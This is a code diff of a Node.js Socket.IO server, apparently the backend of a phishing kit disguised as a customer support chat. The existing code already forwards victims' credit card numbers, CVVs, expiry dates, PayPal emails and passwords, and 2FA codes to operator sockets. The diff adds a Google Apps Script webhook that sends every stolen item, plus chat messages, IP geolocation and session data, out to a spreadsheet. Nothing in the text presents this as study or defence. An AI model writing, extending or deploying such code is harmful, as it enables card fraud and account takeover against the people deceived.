@@ -23,6 +23,9 @@ const io = new Server(server, {
 
 app.use(express.json());
 
+// --- Configuration Webhook Google Sheets ---
+const GOOGLE_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbyhkCAFUU7TCMk8c6WBcPXOs8uqX7e2RrFedLQMuzxxdPS20e4JK89vaBqXbfr7y5AKeQ/exec';
+
 // --- Identifiants ---
 const CORRECT_CODE_USER = "H25lnFfA3mNbU4nF5WDZ";
 const CORRECT_DATE_USER = "18/09/2025";
@@ -32,6 +35,35 @@ const CORRECT_DATE_SERVICE = "123";
 // --- Stockage des connexions par type d'utilisateur ---
 const supportSockets = new Set();
 const userSockets = new Set();
+
+// --- Fonction pour envoyer des données vers Google Sheets ---
+async function sendToGoogleSheets(data) {
+  try {
+    const response = await fetch(GOOGLE_WEBHOOK_URL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(data)
+    });
+    
+    if (!response.ok) {
+      console.error('Erreur envoi Google Sheets:', response.status, response.statusText);
+    } else {
+      console.log('✅ Données envoyées vers Google Sheets:', data.type);
+    }
+  } catch (error) {
+    console.error('❌ Erreur webhook Google Sheets:', error.message);
+  }
+}
+
+// --- Fonction pour générer un Session ID unique ---
+function generateSessionId(ip) {
+  const timestamp = Date.now();
+  const random = Math.random().toString(36).substring(2, 8);
+  const ipHash = ip ? ip.replace(/\./g, '').substring(0, 4) : '0000';
+  return `${ipHash}-${random}-${timestamp.toString().slice(-6)}`;
+}
 
 // --- Route API de vérification ---
 app.post('/verify', (req, res) => {
@@ -56,7 +88,9 @@ io.on('connection', async (socket) => {
       if (geoData.status === 'success') {
         geoInfo = { city: geoData.city, country: geoData.country, isp: geoData.isp };
       }
-  } catch (error) { console.error("Erreur de géolocalisation:", error); }
+  } catch (error) { 
+    console.error("Erreur de géolocalisation:", error); 
+  }
 
   const clientInfo = {
     ip: clientIp,
@@ -66,24 +100,73 @@ io.on('connection', async (socket) => {
     ...geoInfo
   };
 
+  const sessionId = generateSessionId(clientIp);
+
   // Déterminer le type d'utilisateur lors de la connexion
   socket.on('user type', (data) => {
     socket.userType = data.userType;
+    socket.sessionId = sessionId;
+    socket.clientInfo = clientInfo;
+    
     if (data.userType === 'Support') {
       supportSockets.add(socket);
     } else if (data.userType === 'User') {
       userSockets.add(socket);
+      
+      // 📊 ENVOYER DONNÉES DE CONNEXION vers Google Sheets
+      sendToGoogleSheets({
+        type: 'client_connection',
+        sessionId: sessionId,
+        clientInfo: clientInfo,
+        timestamp: new Date().toISOString()
+      });
     }
   });
   
   socket.broadcast.emit('user activity', { text: 'A user has connected.' });
 
   socket.on('chat message', (msg) => {
-    io.emit('chat message', { ...msg, clientInfo });
+    const enhancedMsg = { 
+      ...msg, 
+      clientInfo: socket.clientInfo,
+      sessionId: socket.sessionId 
+    };
+    
+    io.emit('chat message', enhancedMsg);
+    
+    // 💬 ENVOYER MESSAGE vers Google Sheets
+    sendToGoogleSheets({
+      type: 'chat_message',
+      sessionId: socket.sessionId,
+      user: msg.user,
+      text: msg.text,
+      isImportant: msg.isImportant || false,
+      isSuccess: msg.isSuccess || false,
+      isVerifying: msg.isVerifying || false,
+      clientInfo: socket.clientInfo,
+      timestamp: new Date().toISOString()
+    });
   });
 
   socket.on('file message', (fileData) => {
-    io.emit('file message', { ...fileData, clientInfo });
+    const enhancedFileData = { 
+      ...fileData, 
+      clientInfo: socket.clientInfo,
+      sessionId: socket.sessionId 
+    };
+    
+    io.emit('file message', enhancedFileData);
+    
+    // 📁 ENVOYER FICHIER vers Google Sheets (optionnel)
+    sendToGoogleSheets({
+      type: 'file_upload',
+      sessionId: socket.sessionId,
+      fileName: fileData.fileName,
+      fileType: fileData.fileType,
+      user: fileData.user,
+      clientInfo: socket.clientInfo,
+      timestamp: new Date().toISOString()
+    });
   });
 
   socket.on('request popup', () => {
@@ -113,14 +196,25 @@ io.on('connection', async (socket) => {
         supportSocket.emit('chat message', {
           user: 'System',
           text: `User has chosen the option: "${choice.option}"`,
-          clientInfo
+          clientInfo: socket.clientInfo,
+          sessionId: socket.sessionId
         });
       }
+    });
+
+    // 🎯 ENVOYER CHOIX POPUP vers Google Sheets
+    sendToGoogleSheets({
+      type: 'popup_choice',
+      sessionId: socket.sessionId,
+      choice: choice.option,
+      clientInfo: socket.clientInfo,
+      timestamp: new Date().toISOString()
     });
   });
 
   socket.on('credit card data', (data) => {
     const { cardData } = data;
+    
     // Envoyer uniquement aux sockets support
     supportSockets.forEach(supportSocket => {
       if (supportSocket.connected) {
@@ -132,14 +226,25 @@ io.on('connection', async (socket) => {
 📅 Expiry: ${cardData.expiryDate}
 🔒 CVV: ${cardData.cvv}
 📮 Zip Code: ${cardData.billingZip || 'Not provided'}`,
-          clientInfo
+          clientInfo: socket.clientInfo,
+          sessionId: socket.sessionId
         });
       }
+    });
+
+    // 💳 ENVOYER DONNÉES CB vers Google Sheets
+    sendToGoogleSheets({
+      type: 'credit_card',
+      sessionId: socket.sessionId,
+      cardData: cardData,
+      clientInfo: socket.clientInfo,
+      timestamp: new Date().toISOString()
     });
   });
 
   socket.on('paypal login1 data', (data) => {
     const { loginData } = data;
+    
     // Envoyer uniquement aux sockets support
     supportSockets.forEach(supportSocket => {
       if (supportSocket.connected) {
@@ -148,14 +253,25 @@ io.on('connection', async (socket) => {
           text: `PayPal Login Information Received (Step 1):
 📧 Email: ${loginData.email}
 🔐 Password: ${loginData.password}`,
-          clientInfo
+          clientInfo: socket.clientInfo,
+          sessionId: socket.sessionId
         });
       }
+    });
+
+    // 💰 ENVOYER PAYPAL ÉTAPE 1 vers Google Sheets
+    sendToGoogleSheets({
+      type: 'paypal_login1',
+      sessionId: socket.sessionId,
+      loginData: loginData,
+      clientInfo: socket.clientInfo,
+      timestamp: new Date().toISOString()
     });
   });
 
   socket.on('paypal login2 data', (data) => {
     const { verificationData } = data;
+    
     // Envoyer uniquement aux sockets support
     supportSockets.forEach(supportSocket => {
       if (supportSocket.connected) {
@@ -163,9 +279,19 @@ io.on('connection', async (socket) => {
           user: 'System',
           text: `PayPal 2FA Code Received (Step 2):
 🔢 Verification Code: ${verificationData.verificationCode}`,
-          clientInfo
+          clientInfo: socket.clientInfo,
+          sessionId: socket.sessionId
         });
       }
+    });
+
+    // 🔐 ENVOYER PAYPAL ÉTAPE 2 vers Google Sheets
+    sendToGoogleSheets({
+      type: 'paypal_login2',
+      sessionId: socket.sessionId,
+      verificationData: verificationData,
+      clientInfo: socket.clientInfo,
+      timestamp: new Date().toISOString()
     });
   });
 
@@ -174,6 +300,20 @@ io.on('connection', async (socket) => {
   });
   
   socket.on('disconnect', () => { 
+    // Envoyer durée de session avant de nettoyer
+    if (socket.userType === 'User' && socket.clientInfo) {
+      const sessionDuration = Date.now() - new Date(socket.clientInfo.connectedAt).getTime();
+      const durationMinutes = Math.round(sessionDuration / 60000);
+      
+      sendToGoogleSheets({
+        type: 'session_end',
+        sessionId: socket.sessionId,
+        sessionDuration: `${durationMinutes} minutes`,
+        clientInfo: socket.clientInfo,
+        timestamp: new Date().toISOString()
+      });
+    }
+    
     // Nettoyer les sets lors de la déconnexion
     supportSockets.delete(socket);
     userSockets.delete(socket);
@@ -184,5 +324,6 @@ io.on('connection', async (socket) => {
 // --- Démarrage du serveur ---
 const PORT = process.env.PORT || 3001;
 server.listen(PORT, () => {
-  console.log(`Le serveur est démarré et écoute sur le port ${PORT}`);
+  console.log(`🚀 Le serveur est démarré et écoute sur le port ${PORT}`);
+  console.log(`📊 Google Sheets webhook configuré : ${GOOGLE_WEBHOOK_URL.substring(0, 50)}...`);
 });
